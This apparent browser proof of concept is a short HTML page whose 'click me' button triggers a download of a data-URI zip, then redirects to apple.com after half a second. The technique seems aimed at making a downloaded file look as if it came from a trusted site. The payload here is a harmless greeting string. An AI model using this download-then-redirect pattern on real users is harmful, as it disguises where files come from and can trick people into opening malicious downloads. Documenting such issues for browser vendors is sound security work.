<h1><button id="poc">click me</button></h1>
<script>
  function down(uri, name) {
  var link = document.createElement("a");
  link.download = name;
  link.href = uri;
  link.click();
}
async function init(e) {
  try {
    down("data:application/zip;base64,UGVhY2UgQmUgVXBvbiBZb3U=", "test")
   setTimeout(() => {
    location.href="https://www.apple.com";
   }, 500);
  } catch (e) {
    //
  }
}
  document.querySelector('#poc').addEventListener('click', e => init(e));
</script>
